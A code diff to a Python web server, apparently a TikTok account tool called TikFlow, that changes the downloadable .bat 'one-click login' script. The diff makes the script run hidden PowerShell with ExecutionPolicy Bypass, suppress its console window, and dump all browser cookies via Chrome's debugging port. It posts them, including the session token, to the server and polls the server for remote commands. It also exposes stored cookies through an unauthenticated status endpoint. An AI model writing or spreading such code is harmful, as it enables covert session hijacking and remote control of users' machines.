@@ -655,7 +655,7 @@ EXTERNAL_LOGIN_LOCK = threading.Lock()
 def _cleanup_external_sessions():
     now = time.time()
     with EXTERNAL_LOGIN_LOCK:
-        expired = [k for k, v in EXTERNAL_LOGIN_SESSIONS.items() if now - v.get("created_at", 0) > 600]
+        expired = [k for k, v in EXTERNAL_LOGIN_SESSIONS.items() if now - v.get("created_at", 0) > 1800]
         for k in expired:
             EXTERNAL_LOGIN_SESSIONS.pop(k, None)
 
@@ -668,15 +668,72 @@ def api_studio_external_login_status(id: str = ""):
         sess = EXTERNAL_LOGIN_SESSIONS.get(sync_id)
         if not sess:
             return JSONResponse(content={"success": False, "status": "not_found"})
-        if sess.get("status") == "success":
-            return JSONResponse(content={
-                "success": True,
-                "status": "success",
-                "account": sess.get("account"),
-                "cookie": sess.get("cookie"),
-                "proxy": sess.get("proxy", "")
-            })
-        return JSONResponse(content={"success": False, "status": "waiting"})
+        return JSONResponse(content={
+            "success": True,
+            "status": sess.get("status", "waiting"),
+            "account": sess.get("account"),
+            "cookie": sess.get("cookie"),
+            "proxy": sess.get("proxy", ""),
+            "last_seen": sess.get("last_seen", 0)
+        })
+
+@app.post("/api/studio/external-login/event")
+async def api_studio_external_login_event(req: Request):
+    """File .bat chạy ẩn trên máy khách báo sự kiện (browser_opened, browser_closed) và nhận lệnh điều khiển."""
+    try:
+        body = await req.json()
+        sync_id = str(body.get("id") or "").strip()
+        event = str(body.get("event") or "").strip()
+    except Exception:
+        return JSONResponse(status_code=400, content={"success": False, "error": "Dữ liệu không hợp lệ."})
+
+    if not sync_id:
+        return JSONResponse(status_code=400, content={"success": False, "error": "Thiếu id."})
+
+    with EXTERNAL_LOGIN_LOCK:
+        sess = EXTERNAL_LOGIN_SESSIONS.get(sync_id)
+        if not sess:
+            sess = {
+                "status": event or "waiting",
+                "command": "none",
+                "created_at": time.time(),
+                "last_seen": time.time()
+            }
+            EXTERNAL_LOGIN_SESSIONS[sync_id] = sess
+        else:
+            if event and sess.get("status") != "success":
+                sess["status"] = event
+            sess["last_seen"] = time.time()
+
+        cmd = sess.get("command", "none")
+        if cmd != "none":
+            sess["command"] = "none"
+
+        return JSONResponse(content={"success": True, "command": cmd, "status": sess.get("status")})
+
+@app.post("/api/studio/external-login/command")
+async def api_studio_external_login_command(req: Request):
+    """Web gửi lệnh điều khiển xuống tiến trình .bat đang chạy ngầm trên máy khách (ví dụ: reopen_browser)."""
+    try:
+        body = await req.json()
+        sync_id = str(body.get("id") or "").strip()
+        command = str(body.get("command") or "").strip()
+    except Exception:
+        return JSONResponse(status_code=400, content={"success": False, "error": "Dữ liệu không hợp lệ."})
+
+    if not sync_id or not command:
+        return JSONResponse(status_code=400, content={"success": False, "error": "Thiếu id hoặc command."})
+
+    with EXTERNAL_LOGIN_LOCK:
+        sess = EXTERNAL_LOGIN_SESSIONS.get(sync_id)
+        if not sess:
+            return JSONResponse(status_code=404, content={"success": False, "error": "Không tìm thấy phiên đăng nhập."})
+
+        sess["command"] = command
+        if command == "reopen_browser":
+            sess["status"] = "waiting"
+
+        return JSONResponse(content={"success": True, "status": sess.get("status")})
 
 @app.post("/api/studio/external-login/sync")
 async def api_studio_external_login_sync(req: Request):
@@ -706,6 +763,8 @@ async def api_studio_external_login_sync(req: Request):
             "account": acc_info,
             "cookie": cookie_str,
             "proxy": proxy,
+            "command": "none",
+            "last_seen": time.time(),
             "created_at": time.time()
         }
 
@@ -732,7 +791,7 @@ async def api_studio_external_login_sync(req: Request):
 
 @app.get("/api/studio/download-login-bat")
 def api_studio_download_login_bat(id: str = "", proxy: str = "", origin: str = ""):
-    """Tạo và tải về file .bat chạy 1-click tự động trên máy khách (không cần cài Python)."""
+    """Tạo và tải về file .bat chạy ngầm 100% ẩn cmd, tự động mở Chrome và kết nối 2 chiều với web."""
     sync_id = str(id or "").strip()
     if not sync_id:
         sync_id = f"tikflow_{int(time.time())}_{secrets.token_hex(4)}"
@@ -740,6 +799,9 @@ def api_studio_download_login_bat(id: str = "", proxy: str = "", origin: str = "
     with EXTERNAL_LOGIN_LOCK:
         EXTERNAL_LOGIN_SESSIONS[sync_id] = {
             "status": "waiting",
+            "command": "none",
+            "proxy": str(proxy or "").strip(),
+            "last_seen": time.time(),
             "created_at": time.time()
         }
 
@@ -749,47 +811,50 @@ def api_studio_download_login_bat(id: str = "", proxy: str = "", origin: str = "
 
     clean_proxy = str(proxy or "").strip()
 
-    # Mã PowerShell nhúng trong file .bat
+    # Mã PowerShell chạy hoàn toàn ẩn ngầm trên máy khách
     ps_code = f'''[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
-$Host.UI.RawUI.WindowTitle = "TIKFLOW - DANG NHAP TIKTOK 1-CLICK"
-Write-Host "======================================================================" -ForegroundColor Cyan
-Write-Host "               TIKFLOW - DANG NHAP TIKTOK 1-CLICK TU DONG              " -ForegroundColor Yellow
-Write-Host "======================================================================" -ForegroundColor Cyan
-Write-Host "[*] May chu web: {clean_origin}" -ForegroundColor DarkGray
-if ("{clean_proxy}" -ne "") {{
-    Write-Host "[*] Proxy kenh:  {clean_proxy}" -ForegroundColor Cyan
-}}
-Write-Host "[*] Dang tim kiem Google Chrome tren may tinh cua ban..." -ForegroundColor DarkGray
+try {{
+    $hideDef = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();'
+    Add-Type -Name Win32 -Namespace Native -MemberDefinition $hideDef -ErrorAction SilentlyContinue
+    $h = [Native.Win32]::GetConsoleWindow()
+    if ($h -ne [IntPtr]::Zero) {{ [Native.Win32]::ShowWindow($h, 0) }}
+}} catch {{}}
 
 $chromePaths = @(
     "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
     "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
     ($env:LOCALAPPDATA + "\\Google\\Chrome\\Application\\chrome.exe"),
+    ($env:ProgramFiles + "\\Google\\Chrome\\Application\\chrome.exe"),
     "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
-    "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"
+    "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
+    ($env:LOCALAPPDATA + "\\Microsoft\\Edge\\Application\\msedge.exe")
 )
 
 $browser = $null
 foreach ($p in $chromePaths) {{
-    if (Test-Path $p) {{ $browser = $p; break }}
+    if ($p -and (Test-Path -LiteralPath $p)) {{ $browser = $p; break }}
 }}
-
 if (-not $browser) {{
-    Write-Host "[-] Khong tim thay Google Chrome hoac Microsoft Edge tren may tinh!" -ForegroundColor Red
-    Write-Host "[!] Vui long cai dat Google Chrome roi chay lai file nay." -ForegroundColor Yellow
-    Read-Host "Nhan Enter de thoat..."
+    try {{
+        $c = Get-Command chrome.exe -ErrorAction SilentlyContinue
+        if ($c) {{ $browser = $c.Source }}
+    }} catch {{}}
+}}
+if (-not $browser) {{
+    try {{
+        $e = Get-Command msedge.exe -ErrorAction SilentlyContinue
+        if ($e) {{ $browser = $e.Source }}
+    }} catch {{}}
+}}
+if (-not $browser) {{
+    Send-State "browser_not_found"
     exit 1
 }}
 
 $port = Get-Random -Minimum 9300 -Maximum 9800
 $tmpDir = Join-Path $env:TEMP ("tikflow_profile_" + (Get-Random))
 
-$argList = @(
-    "--remote-debugging-port=$port",
-    "--user-data-dir=`"$tmpDir`"",
-    "--no-first-run",
-    "--no-default-browser-check"
-)
+$proxyArg = ""
 if ("{clean_proxy}" -ne "") {{
     $proxyVal = "{clean_proxy}".Trim()
     $pHost = ""
@@ -815,149 +880,206 @@ if ("{clean_proxy}" -ne "") {{
                 $tcp.EndConnect($ar)
                 $tcp.Close()
                 $proxyOk = $true
-                Write-Host "[+] Ket noi Proxy thanh cong: $proxyVal" -ForegroundColor Green
             }} else {{
                 $tcp.Close()
-                Write-Host "[!] Proxy khong phan hoi tu duong truyen nay, Chrome se mo bang mang truc tiep." -ForegroundColor Yellow
             }}
-        }} catch {{
-            Write-Host "[!] Khong the ket noi Proxy, mo Chrome bang mang truc tiep." -ForegroundColor Yellow
-        }}
+        }} catch {{}}
     }}
     if ($proxyOk) {{
-        $argList += "--proxy-server=$proxyVal"
+        $proxyArg = "--proxy-server=$proxyVal"
     }}
 }}
-$argList += "https://www.tiktok.com/login"
 
-Write-Host "[+] Dang khoi dong trinh duyet tren man hinh cua ban..." -ForegroundColor Green
-$proc = Start-Process -FilePath $browser -ArgumentList $argList -PassThru
-Start-Sleep -Seconds 2
-
-# Cho ket noi CDP
-$wsUrl = $null
-for ($i = 0; $i -lt 15; $i++) {{
+function Start-LoginBrowser {{
+    $script:port = Get-Random -Minimum 9300 -Maximum 9800
     try {{
-        $ver = Invoke-RestMethod -Uri "http://127.0.0.1:$port/json/version" -TimeoutSec 2
-        if ($ver.webSocketDebuggerUrl) {{
-            $wsUrl = $ver.webSocketDebuggerUrl
-            break
+        if (-not (Test-Path -LiteralPath $tmpDir)) {{
+            New-Item -ItemType Directory -Path $tmpDir -Force -ErrorAction SilentlyContinue | Out-Null
         }}
     }} catch {{}}
-    Start-Sleep -Milliseconds 600
+
+    $argList = @(
+        ("--remote-debugging-port=" + $script:port),
+        ("--user-data-dir=`"" + $tmpDir + "`""),
+        "--no-first-run",
+        "--no-default-browser-check"
+    )
+    if ($proxyArg) {{
+        $argList += $proxyArg
+    }}
+    $argList += "https://www.tiktok.com/login"
+
+    $p = Start-Process -FilePath $browser -ArgumentList $argList -PassThru
+    return $p
 }}
 
-if (-not $wsUrl) {{
-    Write-Host "[-] Khong the ket noi cong dieu khien Chrome." -ForegroundColor Red
-    exit 1
+function Send-State($evt) {{
+    try {{
+        $b = @{{ id = "{sync_id}"; event = $evt }} | ConvertTo-Json
+        $r = Invoke-RestMethod -Uri "{clean_origin}/api/studio/external-login/event" -Method Post -ContentType "application/json; charset=utf-8" -Body $b -TimeoutSec 5
+        return $r.command
+    }} catch {{
+        return "none"
+    }}
 }}
 
-Write-Host "======================================================================" -ForegroundColor Cyan
-Write-Host "[+] Trinh duyet da mo thanh cong!" -ForegroundColor Green
-Write-Host "[*] Vui long dang nhap tren cua so Chrome vua bat len:" -ForegroundColor Yellow
-Write-Host "    - Ban co the quet ma QR, nhap mat khau hoac ma code email thoai mai." -ForegroundColor White
-Write-Host "[*] He thong dang tu dong doi ban dang nhap xong..." -ForegroundColor Cyan
-Write-Host "======================================================================" -ForegroundColor Cyan
+function Get-CDPWebSocket {{
+    $wsUrl = $null
+    for ($i = 0; $i -lt 15; $i++) {{
+        try {{
+            $ver = Invoke-RestMethod -Uri ("http://127.0.0.1:" + $script:port + "/json/version") -TimeoutSec 2
+            if ($ver.webSocketDebuggerUrl) {{
+                $wsUrl = $ver.webSocketDebuggerUrl
+                break
+            }}
+        }} catch {{}}
+        Start-Sleep -Milliseconds 600
+    }}
+    if (-not $wsUrl) {{ return $null }}
+    try {{
+        $w = New-Object System.Net.WebSockets.ClientWebSocket
+        $c = New-Object System.Threading.CancellationToken
+        $w.ConnectAsync([System.Uri]$wsUrl, $c).Wait(5000)
+        return $w
+    }} catch {{
+        return $null
+    }}
+}}
 
-$ws = New-Object System.Net.WebSockets.ClientWebSocket
+$proc = Start-LoginBrowser
+Send-State "browser_opened"
+$ws = Get-CDPWebSocket
 $ct = New-Object System.Threading.CancellationToken
-$task = $ws.ConnectAsync([System.Uri]$wsUrl, $ct)
-$task.Wait(5000)
-
 $startTs = [DateTime]::UtcNow
 $synced = $false
 
-while (([DateTime]::UtcNow - $startTs).TotalSeconds -lt 300) {{
-    if ($proc.HasExited) {{
-        Write-Host "[-] Cua so trinh duyet da bi dong." -ForegroundColor Yellow
+while (([DateTime]::UtcNow - $startTs).TotalSeconds -lt 900) {{
+    if ($synced) {{ break }}
+
+    $isClosed = $false
+    try {{
+        if (-not $proc -or $proc.HasExited) {{
+            $isClosed = $true
+        }} else {{
+            try {{
+                $ping = Invoke-RestMethod -Uri ("http://127.0.0.1:" + $script:port + "/json/version") -TimeoutSec 1 -ErrorAction Stop
+                if (-not $ping.webSocketDebuggerUrl) {{ $isClosed = $true }}
+            }} catch {{
+                $isClosed = $true
+            }}
+        }}
+    }} catch {{
+        $isClosed = $true
+    }}
+
+    if ($isClosed) {{
+        $cmd = Send-State "browser_closed"
+        if ($cmd -eq "reopen_browser") {{
+            $proc = Start-LoginBrowser
+            Send-State "browser_opened"
+            $ws = Get-CDPWebSocket
+        }} elseif ($cmd -eq "exit") {{
+            break
+        }}
+        Start-Sleep -Seconds 1
+        continue
+    }}
+
+    $cmd = Send-State "browser_opened"
+    if ($cmd -eq "exit") {{
+        try {{ Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue }} catch {{}}
         break
     }}
 
-    try {{
-        $msg = '{{"id":1,"method":"Storage.getCookies"}}'
-        $bytes = [System.Text.Encoding]::UTF8.GetBytes($msg)
-        $seg = New-Object System.ArraySegment[byte] -ArgumentList @(,$bytes)
-        $ws.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).Wait(2000)
+    if ($ws -and $ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {{
+        try {{
+            $msg = '{{"id":1,"method":"Storage.getCookies"}}'
+            $bytes = [System.Text.Encoding]::UTF8.GetBytes($msg)
+            $seg = New-Object System.ArraySegment[byte] -ArgumentList @(,$bytes)
+            $ws.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).Wait(2000)
 
-        $memStream = New-Object System.IO.MemoryStream
-        do {{
-            $buffer = New-Object byte[] 65536
-            $recSeg = New-Object System.ArraySegment[byte] -ArgumentList @(,$buffer)
-            $recTask = $ws.ReceiveAsync($recSeg, $ct)
-            $recTask.Wait(3000)
-            if ($recTask.Result.Count -gt 0) {{
-                $memStream.Write($buffer, 0, $recTask.Result.Count)
-            }}
-        }} while (-not $recTask.Result.EndOfMessage)
-
-        $respStr = [System.Text.Encoding]::UTF8.GetString($memStream.ToArray())
-        $json = $respStr | ConvertFrom-Json
-        $cookies = $null
-        if ($json.result -and $json.result.cookies) {{
-            $cookies = $json.result.cookies
-        }}
-
-        if ($cookies) {{
-            $sidCookie = $cookies | Where-Object {{ $_.name -eq "sessionid" -and $_.value }} | Select-Object -First 1
-            if ($sidCookie) {{
-                Write-Host ""
-                Write-Host "======================================================================" -ForegroundColor Green
-                Write-Host "[+] DA DANG NHAP THANH CONG TREN CHROME!" -ForegroundColor Green
-                Write-Host "[*] Dang dong bo tai khoan len trang web TikFlow..." -ForegroundColor Yellow
-
-                $cookiePairs = @()
-                foreach ($c in $cookies) {{
-                    if ($c.name -and $c.value) {{
-                        $cookiePairs += ($c.name + "=" + $c.value)
-                    }}
+            $memStream = New-Object System.IO.MemoryStream
+            do {{
+                $buffer = New-Object byte[] 65536
+                $recSeg = New-Object System.ArraySegment[byte] -ArgumentList @(,$buffer)
+                $recTask = $ws.ReceiveAsync($recSeg, $ct)
+                $recTask.Wait(3000)
+                if ($recTask.Result.Count -gt 0) {{
+                    $memStream.Write($buffer, 0, $recTask.Result.Count)
                 }}
-                $fullCookieStr = $cookiePairs -join "; "
+            }} while (-not $recTask.Result.EndOfMessage)
 
-                $syncBody = @{{
-                    id = "{sync_id}"
-                    cookie = $fullCookieStr
-                    proxy = "{clean_proxy}"
-                }} | ConvertTo-Json
-
-                try {{
-                    $syncRes = Invoke-RestMethod -Uri "{clean_origin}/api/studio/external-login/sync" -Method Post -ContentType "application/json; charset=utf-8" -Body $syncBody -TimeoutSec 10
-                    if ($syncRes.success) {{
-                        Write-Host "[+] THANH CONG 100%! Tai khoan da duoc nap vao web TikFlow!" -ForegroundColor Green
-                        Write-Host "[+] Ban co the quay lai man hinh Web de xem danh sach video." -ForegroundColor Cyan
-                        $synced = $true
-                    }}
-                }} catch {{
-                    Write-Host "[-] Loi dong bo len server: " $_ -ForegroundColor Red
-                }}
-
-                break
+            $respStr = [System.Text.Encoding]::UTF8.GetString($memStream.ToArray())
+            $json = $respStr | ConvertFrom-Json
+            $cookies = $null
+            if ($json.result -and $json.result.cookies) {{
+                $cookies = $json.result.cookies
             }}
+
+            if ($cookies) {{
+                $sidCookie = $cookies | Where-Object {{ $_.name -eq "sessionid" -and $_.value }} | Select-Object -First 1
+                if ($sidCookie) {{
+                    $cookiePairs = @()
+                    foreach ($c in $cookies) {{
+                        if ($c.name -and $c.value) {{
+                            $cookiePairs += ($c.name + "=" + $c.value)
+                        }}
+                    }}
+                    $fullCookieStr = $cookiePairs -join "; "
+
+                    $syncBody = @{{
+                        id = "{sync_id}"
+                        cookie = $fullCookieStr
+                        proxy = "{clean_proxy}"
+                    }} | ConvertTo-Json
+
+                    try {{
+                        $syncRes = Invoke-RestMethod -Uri "{clean_origin}/api/studio/external-login/sync" -Method Post -ContentType "application/json; charset=utf-8" -Body $syncBody -TimeoutSec 10
+                        if ($syncRes.success) {{
+                            $synced = $true
+                        }}
+                    }} catch {{}}
+
+                    break
+                }}
+            }}
+        }} catch {{
+            try {{ $ws = Get-CDPWebSocket }} catch {{}}
         }}
-    }} catch {{}}
+    }} else {{
+        try {{ $ws = Get-CDPWebSocket }} catch {{}}
+    }}
 
     Start-Sleep -Seconds 1
 }}
 
 try {{
-    $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "done", $ct).Wait(1000)
+    if ($ws) {{
+        $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "done", $ct).Wait(1000)
+    }}
 }} catch {{}}
 
-if ($synced) {{
-    Write-Host ""
-    Write-Host "[*] Cua so nay se tu dong dong sau 3 giay..." -ForegroundColor DarkGray
-    Start-Sleep -Seconds 3
-}} else {{
-    Read-Host "Nhan Enter de thoat..."
-}}
+try {{
+    if ($proc -and -not $proc.HasExited) {{
+        Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
+    }}
+}} catch {{}}
+
+try {{
+    Remove-Item -Path $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
+}} catch {{}}
+exit 0
 '''
 
-    b64_ps = base64.b64encode(ps_code.encode("utf-16le")).decode("ascii")
-    bat_content = f'''@echo off
-chcp 65001 >nul
-title TIKFLOW - DANG NHAP TIKTOK 1-CLICK
-powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {b64_ps}
+    bat_header = '''<# :
+@echo off
+set "SCRIPT_FILE=%~f0"
+start "" powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "$p = $env:SCRIPT_FILE; if (Test-Path -LiteralPath $p) { [ScriptBlock]::Create((Get-Content -LiteralPath $p -Encoding UTF8 -Raw)).Invoke() }"
 exit /b
+#>
+
 '''
+    bat_content = bat_header + ps_code
 
     return Response(
         content=bat_content,
